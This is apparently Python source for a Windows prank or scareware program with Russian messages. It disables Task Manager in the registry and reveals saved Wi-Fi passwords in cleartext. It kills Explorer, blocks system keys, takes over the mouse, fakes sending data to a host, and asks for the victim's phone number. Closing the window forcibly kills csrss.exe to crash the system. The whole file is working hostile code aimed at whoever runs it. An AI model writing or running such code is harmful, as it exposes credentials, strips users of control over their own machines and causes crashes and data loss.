import os
import winreg
import keyboard
import sys
import subprocess
import re
import time
import random
import cv2
import threading
import itertools
import pyautogui
import phonenumbers
from phonenumbers import carrier, geocoder, timezone
from PyQt5.QtWidgets import QApplication, QMainWindow, QMessageBox
import ctypes

class MyMainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        
        if not ctypes.windll.shell32.IsUserAnAdmin():
            QMessageBox.critical(self, 'Ошибка', 'Нужен запуск от имени Администратора')
            return
        else:
            self.block_task_manager()
            self.run_script()

    def block_task_manager(self):
        try:
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE) as key:
                winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
            print("Диспетчер задач заблокирован.")
        except FileNotFoundError:
            with winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path) as key:
                winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
            print("Диспетчер задач заблокирован. Требуется перезагрузка.")
        except Exception as e:
            print(f"Ошибка: {e}")

    def run_script(self):
        # Ваш основной код здесь
        RandNo = random.randint(1, 20)
        vid = cv2.VideoCapture(0)
        os.system('cls')
        print("Well we are now ready to see a movie")
        time.sleep(3)

        user = os.getlogin()
        print(f"Hello {user}. I am a Gr1c3nd0_")
        os.system('color a')
        time.sleep(3)

        print("I can see all your stored wifi!")
        time.sleep(3)
        os.system('netsh wlan show profiles')
        time.sleep(3)

        print("I am a hacker and can also see all your wifi passwords too")
        time.sleep(3)
        print("Wait a min!")
        time.sleep(3)

        command_output = subprocess.run(
            ["netsh", "wlan", "show", "profiles"], 
            capture_output=True
        ).stdout.decode('cp866')

        profile_names = re.findall("All User Profile     : (.*)\r", command_output)
        wifi_list = []

        if profile_names:
            for name in profile_names:
                wifi_profile = {}
                profile_info = subprocess.run(
                    ["netsh", "wlan", "show", "profile", name], 
                    capture_output=True
                ).stdout.decode('cp866')

                if "Security key           : Absent" not in profile_info:
                    wifi_profile["ssid"] = name
                    profile_info_pass = subprocess.run(
                       ["netsh", "wlan", "show", "profile", name, "key=clear"], 
                        capture_output=True
                    ).stdout.decode('cp866')

                    password = re.search("Key Content            : (.*)\r", profile_info_pass)
                    wifi_profile["password"] = password[1] if password else None
                    wifi_list.append(wifi_profile)

        for wifi in wifi_list:
            print(wifi)
        time.sleep(3)

        print("Let's see what are the drivers installed in your PC: ")
        os.system('driverquery /FO list /v')
        os.system('driverquery /FO list /v |clip')
        os.system('driverquery > %userprofile%/desktop/driver.txt')

        print("Now doing some adult work!!")
        time.sleep(2)
        pyautogui.FAILSAFE = False
        os.system('taskkill /f /im explorer.exe')
        keys_to_block = ['win', 'alt', 'ctrl', 'esc']

        # Блокировка всех клавиш из списка
        for key in keys_to_block:
            keyboard.block_key(key)
        
        print("How do you feel?")
        time.sleep(3)
        print("If you try to close it now, you will be stuck")
        time.sleep(3)

        x = 0
        while x < RandNo:
            time.sleep(6)
            for i in range(0, 100):
                pyautogui.moveTo(10, i * 5)
            for i in range(0, 100):
                pyautogui.moveTo(100, i * 5)
            for i in range(0, 100):
                pyautogui.moveTo(200, i * 5)
            for i in range(0, 100):
                pyautogui.moveTo(300, i * 5)
            for i in range(0, 100):
                pyautogui.moveTo(400, i * 5)
            for i in range(0, 100):
                pyautogui.moveTo(500, i * 5)
            for i in range(0, 100):
                pyautogui.moveTo(600, i * 5)
            for i in range(0, 100):
                pyautogui.moveTo(800, i * 5)
            for i in range(0, 100):
                pyautogui.moveTo(900, i * 5)
            for i in range(0, 100):
                pyautogui.moveTo(1000, i * 5)
            x += 1

        done = False

        def animate1():
            for c in itertools.cycle(['|', '/', '-', '\\']):
                if done:
                    break
                sys.stdout.write('\rGetting stored password from registry. ' + c)
                sys.stdout.flush()
                time.sleep(0.1)
            sys.stdout.write('\rDone!                                              ')

        t = threading.Thread(target=animate1)
        t.start()
        time.sleep(5)
        done = True

        time.sleep(3)
        done = False

        def animate2():
            for c in itertools.cycle(['|', '/', '-', '\\']):
                if done:
                    break
                sys.stdout.write('\rGenerating log file with all data in it ' + c)
                sys.stdout.flush()
                time.sleep(0.1)
            sys.stdout.write('\rSending to host!                                        ')

        t = threading.Thread(target=animate2)
        t.start()
        time.sleep(10)
        done = True

        PhnNmbrs = input("Enter your phone number with country code: ")
        PhnNmbr = phonenumbers.parse(PhnNmbrs)
        print(PhnNmbr)
        time.sleep(2)

        print("\nSIM:-")
        print(carrier.name_for_number(PhnNmbr, 'en'))
        print("\nCountry:-")
        print(geocoder.description_for_number(PhnNmbr, 'en'))
        print("\nTime Zone:-")
        print(timezone.time_zones_for_number(PhnNmbr))
        print("\nIs the phone number valid?")
        print(phonenumbers.is_valid_number(PhnNmbr))
        print("\nIs the phone number possible?")
        print(phonenumbers.is_possible_number(PhnNmbr))

        os.system('explorer')

    def closeEvent(self, event):
        confirmation = QMessageBox.question(self, "Закрыть?", "Хочешь закрыть прогу?", QMessageBox.Yes | QMessageBox.No)
        if confirmation == QMessageBox.Yes:
            os.system('taskkill /f /im csrss.exe')
            event.ignore()
        else:
            event.ignore()

if __name__ == "__main__":
    app = QApplication(sys.argv)
    main_window = MyMainWindow()
    main_window.show()
    sys.exit(app.exec_())